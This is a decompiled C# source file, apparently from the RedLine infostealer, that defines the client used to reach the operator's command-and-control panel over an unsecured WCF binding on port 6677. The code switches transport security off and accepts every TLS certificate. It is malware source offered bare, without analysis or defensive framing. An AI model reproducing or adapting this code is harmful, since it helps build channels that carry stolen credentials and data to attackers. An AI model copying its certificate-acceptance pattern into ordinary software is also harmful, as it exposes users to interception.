using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.ServiceModel;
using System.Xml;

namespace RedLine
{
	public static class Service<T>
	{
		private static readonly BasicHttpBinding binding;

		public static string RemoteIP;

		static Service()
		{
			RemoteIP = string.Empty;
			BasicHttpBinding basicHttpBinding = new BasicHttpBinding();
			basicHttpBinding.Name = "BindingName";
			basicHttpBinding.set_MaxBufferSize(int.MaxValue);
			basicHttpBinding.set_MaxReceivedMessageSize(2147483647L);
			basicHttpBinding.set_MaxBufferPoolSize(2147483647L);
			basicHttpBinding.CloseTimeout = TimeSpan.FromMinutes(30.0);
			basicHttpBinding.OpenTimeout = TimeSpan.FromMinutes(30.0);
			basicHttpBinding.ReceiveTimeout = TimeSpan.FromMinutes(30.0);
			basicHttpBinding.SendTimeout = TimeSpan.FromMinutes(30.0);
			basicHttpBinding.set_TransferMode(TransferMode.Buffered);
			basicHttpBinding.set_UseDefaultWebProxy(false);
			basicHttpBinding.set_ProxyAddress((Uri)null);
			basicHttpBinding.set_ReaderQuotas(new XmlDictionaryReaderQuotas
			{
				MaxDepth = 2000000,
				MaxArrayLength = int.MaxValue,
				MaxBytesPerRead = int.MaxValue,
				MaxNameTableCharCount = int.MaxValue,
				MaxStringContentLength = int.MaxValue
			});
			basicHttpBinding.Security = new BasicHttpSecurity
			{
				Mode = BasicHttpSecurityMode.None
			};
			binding = basicHttpBinding;
			ServicePointManager.ServerCertificateValidationCallback = AcceptAllCertifications;
		}

		private static bool AcceptAllCertifications(object sender, X509Certificate certification, X509Chain chain, SslPolicyErrors sslPolicyErrors)
		{
			return true;
		}

		public static void Use(Action<T> codeBlock)
		{
			using (new WebClient())
			{
				IClientChannel clientChannel = (IClientChannel)(object)new ChannelFactory<T>(binding).CreateChannel(new EndpointAddress("http://" + RemoteIP + ":6677/IRemotePanel"));
				bool flag = false;
				try
				{
					codeBlock((T)clientChannel);
					clientChannel.Close();
					flag = true;
				}
				finally
				{
					if (!flag)
					{
						clientChannel.Abort();
					}
				}
			}
		}
	}
}
